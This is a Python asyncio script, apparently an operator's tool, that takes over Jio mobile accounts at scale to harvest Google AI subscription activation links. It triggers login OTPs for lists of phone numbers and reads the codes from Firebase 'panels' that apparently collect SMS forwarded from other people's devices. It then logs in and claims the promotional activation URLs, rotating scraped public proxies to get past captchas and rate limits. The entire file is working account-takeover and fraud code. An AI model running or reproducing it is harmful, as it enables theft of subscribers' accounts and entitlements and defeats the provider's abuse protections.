#!/usr/bin/env python3
"""brutal_daemon.py — asyncio freshlink harvester for the Jio panel farm.

End-to-end per number, all concurrent: sendOtp -> poll the panel for the
forwarded OTP -> validateOtp -> mint the Google AI activation URL.  Every
freshlink lands in data/brutal_freshlinks.jsonl the moment it exists and is
echoed to stdout for the operator.

Everything is asyncio, so 250 concurrent numbers and 40 concurrent proxy
hunters cost no threads.  Proxies are pulled from public lists and probed
against the jio sendOtp origin (any HTTP answer proves the exit reached it);
dead exits are dropped and never re-probed.  Numbers answered
locked/captcha are parked for cooldown and retried on the next pass.

    python3 brutal_daemon.py --workers 250 --hunters 40
"""

from __future__ import annotations

import argparse
import asyncio
import html
import json
import calendar
import random
import re
import sys
import time
from pathlib import Path
from urllib.parse import unquote

import aiohttp

DATA = Path(__file__).resolve().parent / "data"
LINKS = DATA / "brutal_freshlinks.jsonl"
LOCKED = DATA / "brutal_locked.json"
DEAD = DATA / "brutal_dead.json"   # numbers that are not Jio any more
RANKED = DATA / "brutal_jio_live.json"

PANELS = {
    "rtx-c9": "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c11": "https://rtx-c11-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx-c3": "https://rtx-c3-default-rtdb.firebaseio.com",
    "rtx-c13": "https://rtx-c13-default-rtdb.asia-southeast1.firebasedatabase.app",
}

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
JIO_H = {
    "User-Agent": UA, "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-IN,en;q=0.9", "Origin": "https://www.jio.com",
    "Referer": "https://www.jio.com/selfcare/login/", "x-request-source": "wap",
}
DASH_H = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
OTT_H = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/googleai/"
                                    "?header=no&type=Z0241&source=JIO"}

SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = ("https://www.jio.com/api/jio-ott-service/ott/subscription/activate/"
                "Z0241?source=JIO")
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"

# Panel SMS stamps are IST (UTC+5:30); this host runs CST (UTC+8).  mktime()
# would read an IST wall clock as CST and land 5.5h in the past, so parse the
# stamp as UTC and shift it back by the IST offset instead.
IST_UTC_OFFSET = 5 * 3600 + 30 * 60


def ist_epoch(stamp: str) -> float | None:
    try:
        naive = time.strptime(stamp[:21], "%Y-%m-%d | %H:%M:%S")
    except ValueError:
        return None
    return calendar.timegm(naive) - IST_UTC_OFFSET


OTP_RE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\s+is your One time password \(OTP\) to sign-in", re.I)
ACTIVATION_RE = re.compile(
    r"serviceactivation\.google\.com/subscription/new/(?P<token>[^\"'\s]+)", re.I)

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000",
]
PROBE_OK = (200, 400, 403, 429)
PROBE_NUMBER = "9776697749"  # any number works: we only need the exit to answer

STOP = asyncio.Event()


# ---------------------------------------------------------------- proxy pool

class ProxyPool:
    def __init__(self) -> None:
        self.good: list[str] = []
        self.bad: set[str] = set()
        self.seen: set[str] = set()
        self._lock = asyncio.Lock()
        self._rr = 0

    async def add(self, proxies: list[str]) -> int:
        async with self._lock:
            new = [p for p in proxies if p not in self.good and p not in self.bad]
            self.good.extend(new)
            return len(new)

    async def pick(self) -> str | None:
        async with self._lock:
            if not self.good:
                return None
            # round-robin, not random: random.choice re-hits the same hot
            # proxy under 40 workers, it dies, and the pool drains fast
            px = self.good[self._rr % len(self.good)]
            self._rr += 1
            return px

    async def drop(self, px: str) -> None:
        async with self._lock:
            if px in self.good:
                self.good.remove(px)
            self.bad.add(px)

    async def unseen(self, raw: set[str]) -> list[str]:
        async with self._lock:
            return [p for p in raw if p not in self.seen]

    async def mark_seen(self, pxs: list[str]) -> None:
        async with self._lock:
            self.seen.update(pxs)

    def __len__(self) -> int:
        return len(self.good)


POOL = ProxyPool()


async def harvest_raw(session: aiohttp.ClientSession) -> set[str]:
    pool: set[str] = set()

    async def one(u: str) -> None:
        try:
            async with session.get(u, timeout=aiohttp.ClientTimeout(total=15)) as r:
                if r.status == 200:
                    txt = await r.text()
                    pool.update(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b", txt))
        except (aiohttp.ClientError, asyncio.TimeoutError):
            pass

    await asyncio.gather(*(one(u) for u in PROXY_SOURCES))
    return pool


async def probe(session: aiohttp.ClientSession, px: str) -> str | None:
    try:
        async with session.post(
            SEND_OTP_URL,
            json={"mobileNumber": PROBE_NUMBER, "loginFlowType": "MOBILE",
                  "alternateNumber": ""},
            proxy=f"http://{px}", timeout=aiohttp.ClientTimeout(total=8),
            ssl=False,
        ) as r:
            if r.status in PROBE_OK:
                return f"http://{px}"
    except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
        pass
    return None


async def hunt_batch(session: aiohttp.ClientSession, batch: int = 800,
                     workers: int = 200) -> int:
    raw = await harvest_raw(session)
    todo = await POOL.unseen(raw)
    random.shuffle(todo)
    todo = todo[:batch]
    if not todo:
        return len(POOL)
    await POOL.mark_seen(todo)
    sem = asyncio.Semaphore(workers)

    async def guarded(p: str) -> str | None:
        async with sem:
            return await probe(session, p)

    found = [r for r in await asyncio.gather(*(guarded(p) for p in todo)) if r]
    await POOL.add(found)
    return len(POOL)


async def hunter_loop(idx: int, session: aiohttp.ClientSession, idle: float) -> None:
    while not STOP.is_set():
        try:
            n = await hunt_batch(session)
            if idx == 0:
                print(f"[proxy] pool={n} seen={len(POOL.seen)}", flush=True)
        except Exception as exc:  # noqa: BLE001
            print(f"[proxy] hunter{idx} {type(exc).__name__}: {exc}", flush=True)
        try:
            await asyncio.wait_for(STOP.wait(), timeout=idle)
        except asyncio.TimeoutError:
            pass


# ---------------------------------------------------------------- jio flow

async def recent_otps(session: aiohttp.ClientSession, mobile: str,
                     device: str, panel: str) -> list[tuple[float, str]]:
    """Every OTP for this number, newest first, so a burned code does not
    waste the whole attempt."""
    base = PANELS[panel]
    url = (f"{base}/data/{device}/smsData.json?orderBy=%22%24key%22"
           f"&limitToLast=60")
    payload = None
    for _ in range(3):  # panels throttle under parallel load; retry once
        try:
            async with session.get(
                    url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                if r.status == 200:
                    payload = await r.json(content_type=None)
                    break
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError):
            pass
        await asyncio.sleep(1.5)
    if payload is None:
        return []
    found: list[tuple[float, str]] = []
    for v in (payload or {}).values():
        if not isinstance(v, dict):
            continue
        if mobile not in (v.get("info") or "").replace("+91", ""):
            continue
        m = OTP_RE.search(v.get("message") or "")
        if not m:
            continue
        t = ist_epoch(v.get("time", ""))
        if t is None:
            continue
        found.append((t, m.group(1)))
    found.sort(key=lambda x: x[0], reverse=True)
    return found


async def rj(resp: aiohttp.ClientResponse) -> dict:
    try:
        d = await resp.json(content_type=None)
        return d if isinstance(d, dict) else {}
    except (ValueError, aiohttp.ClientError):
        return {}


def rerr(d: dict, ok: bool) -> bool:
    if not ok:
        return True
    if d.get("errorMessage") or d.get("error"):
        return True
    return str(d.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def api_message(d: dict) -> str:
    for n in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if d.get(n):
            return str(d[n])
    return ""


def already_active(v: str) -> bool:
    n = " ".join((v or "").lower().replace("_", " ").split())
    return any(p in n for p in ("already active", "already activated",
                                "already redeemed", "already claimed",
                                "already availed"))


def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        dec = unquote(text)
        if dec == text:
            break
        text = dec
    m = ACTIVATION_RE.search(text)
    return ("https://serviceactivation.google.com/subscription/new/"
            + m.group("token")) if m else ""


async def _post_otp(session: aiohttp.ClientSession, mobile: str,
                    px: str | None) -> tuple[bool, dict, int]:
    async with session.post(
        SEND_OTP_URL,
        json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
              "alternateNumber": ""},
        proxy=px, timeout=aiohttp.ClientTimeout(total=15), ssl=False,
    ) as r:
        return r.ok, await rj(r), r.status


async def send_otp(session: aiohttp.ClientSession, mobile: str,
                   tries: int = 8) -> tuple[bool, str, str | None]:
    """Direct first, proxy only when the direct exit is answered captcha/429.

    The lockout is per-number, so a fresh proxy does not revive a locked
    number — it only matters when this host's own IP has been throttled.
    """
    last = "otp_send_failed"
    for i in range(tries):
        px = None if i == 0 else await POOL.pick()
        try:
            ok, d, code = await _post_otp(session, mobile, px)
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            if px:
                await POOL.drop(px)
            last = "send_error"
            continue
        up = str(d.get("errorMessage", "")).upper()
        if "INVALID_JIONUMBER" in up:
            return False, "not_jio_number", px
        if "LOCKED" in up:
            return False, "locked", px
        if "CAPTCHA" in up or code == 429:
            if px:
                await POOL.drop(px)
            last = "captcha"
            continue
        if not ok or d.get("errorMessage") or d.get("error"):
            last = "otp_send_failed"
            continue
        return True, "otp_sent", px
    return False, last, None


async def verify_otp(session: aiohttp.ClientSession, mobile: str,
                     otp: str, px: str | None) -> bool:
    try:
        async with session.post(
            VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp},
            proxy=px, timeout=aiohttp.ClientTimeout(total=15), ssl=False,
        ) as r:
            return not rerr(await rj(r), r.ok)
    except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
        return False


async def get_activation(session: aiohttp.ClientSession,
                         px: str | None) -> tuple[str, str]:
    try:
        async with session.get(AUTH_URL, headers=DASH_H, proxy=px, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=15)) as a:
            ad = await rj(a)
            if not a.ok or str(ad.get("loginFlag", "")).lower() != "true":
                return "api_session_invalid", ""
        async with session.get(NAVIGATE_URL, headers=DASH_H, proxy=px, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=15)):
            pass
        async with session.get(ACTIVATE_URL, headers=OTT_H, proxy=px, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=15)) as act:
            acd = await rj(act)
            if already_active(api_message(acd)):
                return "already_active", ""
            if not act.ok or str(acd.get("errorCode", "200")) != "200":
                return "activation_api_failed", ""
        async with session.get(GOOGLE_URL, headers=OTT_H, proxy=px, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=15)) as g:
            gd = await rj(g)
            if already_active(api_message(gd)):
                return "already_active", ""
            url = activation_url(str(gd.get("redirectionURL", "")))
            if not url:
                return "no_activation_url", ""
        try:
            async with session.get(SUBMIT_URL, headers=OTT_H, proxy=px, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=10)):
                pass
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            pass
        return "activation_url_found", url
    except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
        return "activation_api_failed", ""


# ---------------------------------------------------------------- one number

async def attempt(session: aiohttp.ClientSession, cand: dict,
                  otp_wait: int) -> dict:
    mobile, device, panel = cand["mobile"], cand["device"], cand["panel"]

    ok, status, px = await send_otp(session, mobile)
    if status in ("locked", "captcha", "not_jio_number"):
        if status == "not_jio_number":
            _remember(DEAD, mobile)   # never retry a number that left Jio
        return {"mobile": mobile, "ok": False, "status": status}
    if not ok:
        if px:
            await POOL.drop(px)
        return {"mobile": mobile, "ok": False, "status": status}

    # the panel stamps SMS in IST; anchor on the send time so an OTP that
    # arrived before this request is never mistaken for the fresh one.
    # no negative slack: a probe run moments earlier can leave an older OTP
    # sitting on the same device, and reusing it only burns the attempt
    sent_at = time.time()
    otp = None
    deadline = time.monotonic() + otp_wait
    # SMS lands in the first seconds; poll tight so we beat everyone else
    # reading the same panel, then back off if it is slow to arrive
    delays = (0.25, 0.25, 0.25, 0.35, 0.35, 0.5, 0.5, 0.75, 1.0, 1.0)
    i = 0
    otps: list[tuple[float, str]] = []
    while time.monotonic() < deadline and not STOP.is_set():
        otps = [o for o in await recent_otps(session, mobile, device, panel)
                if o[0] >= sent_at]
        if otps:
            break
        await asyncio.sleep(delays[i] if i < len(delays) else 1.0)
        i += 1

    if not otps:
        return {"mobile": mobile, "ok": False, "status": "otp_timeout"}

    # try every code we hold: the newest may already be burned by someone
    # else reading the same panel, an older one can still be live
    for _, code in otps:
        if await verify_otp(session, mobile, code, px):
            otp = code
            break
    if not otp:
        return {"mobile": mobile, "ok": False, "status": "verify_failed",
                "otp": otps[0][1]}

    st, url = await get_activation(session, px)
    rec = {"mobile": mobile, "ok": bool(url), "status": st, "otp": otp,
           "panel": panel, "device": device, "name": cand.get("name", ""),
           "ts": int(time.time())}
    if url:
        rec["url"] = url
        async with asyncio.Lock():
            with LINKS.open("a") as fh:
                fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return rec


# ---------------------------------------------------------------- main loop

def _remember(path: Path, mobile: str) -> None:
    """Append a number to a persistent set file, ignoring duplicates."""
    try:
        cur = set(json.loads(path.read_text())) if path.exists() else set()
        if mobile not in cur:
            cur.add(mobile)
            path.write_text(json.dumps(sorted(cur)))
    except (OSError, ValueError):
        pass


def load_candidates() -> list[dict]:
    ranked = json.loads(RANKED.read_text())
    done = ({json.loads(l)["mobile"] for l in LINKS.read_text().splitlines()
             if l.strip()} if LINKS.exists() else set())
    dead = (set(json.loads(DEAD.read_text()))
            if DEAD.exists() else set())
    parked = (set(json.loads(LOCKED.read_text()))
              if LOCKED.exists() else set())
    return [x for x in ranked
            if x["mobile"] not in done and x["mobile"] not in dead
            and x["mobile"] not in parked]


async def run_pass(session: aiohttp.ClientSession, cands: list[dict],
                   workers: int, otp_wait: int) -> tuple[int, set[str]]:
    got = 0
    parked: set[str] = set()
    sem = asyncio.Semaphore(workers)

    async def guarded(c: dict) -> dict:
        async with sem:
            return await attempt(session, c, otp_wait)

    tasks = [asyncio.create_task(guarded(c)) for c in cands]
    for fut in asyncio.as_completed(tasks):
        try:
            r = await fut
        except Exception as exc:  # noqa: BLE001
            print(f"[!] {type(exc).__name__}: {exc}", flush=True)
            continue
        st = r.get("status", "?")
        if r.get("ok"):
            got += 1
            print(f"\n[LINK] {r['mobile']} otp={r['otp']} panel={r['panel']} "
                  f"name={r['name'][:20]}", flush=True)
            print(f"       {r['url']}\n", flush=True)
        else:
            print(f"[{st}] {r['mobile']} {r.get('panel', '')}", flush=True)
            if st in ("locked", "captcha"):
                parked.add(r["mobile"])
    return got, parked


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--workers", type=int, default=250)
    ap.add_argument("--hunters", type=int, default=40)
    ap.add_argument("--passes", type=int, default=0, help="0 = forever")
    ap.add_argument("--otp-wait", type=int, default=30)
    ap.add_argument("--hunter-idle", type=float, default=2.0)
    ap.add_argument("--cooldown", type=int, default=90)
    args = ap.parse_args()

    LINKS.parent.mkdir(parents=True, exist_ok=True)
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout,
                                     headers={"User-Agent": UA}) as session:
        for i in range(args.hunters):
            asyncio.create_task(hunter_loop(i, session, args.hunter_idle),
                                name=f"hunter{i}")
        print(f"[*] seeding proxies with {args.hunters} hunters...", flush=True)
        await hunt_batch(session, batch=1500, workers=400)
        print(f"[*] pool={len(POOL)} workers={args.workers}", flush=True)

        got = 0
        passes = 0
        while not STOP.is_set():
            passes += 1
            cands = load_candidates()
            if not cands:
                print("[*] no candidates left", flush=True)
                break
            print(f"\n[pass {passes}] {len(cands)} candidates pool={len(POOL)}",
                  flush=True)
            g, parked = await run_pass(session, cands, args.workers, args.otp_wait)
            got += g
            if parked:
                cur = (set(json.loads(LOCKED.read_text()))
                       if LOCKED.exists() else set())
                cur |= parked
                LOCKED.write_text(json.dumps(sorted(cur)))
                print(f"[*] parked {len(parked)} for cooldown", flush=True)
            if args.passes and passes >= args.passes:
                break
            if not load_candidates():
                break
            print(f"[*] cooldown {args.cooldown}s before next pass", flush=True)
            try:
                await asyncio.wait_for(STOP.wait(), timeout=args.cooldown)
            except asyncio.TimeoutError:
                pass

        print(f"\n[done] {got} freshlinks in {passes} pass(es)")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        print("\n[stopped]")
        sys.exit(0)
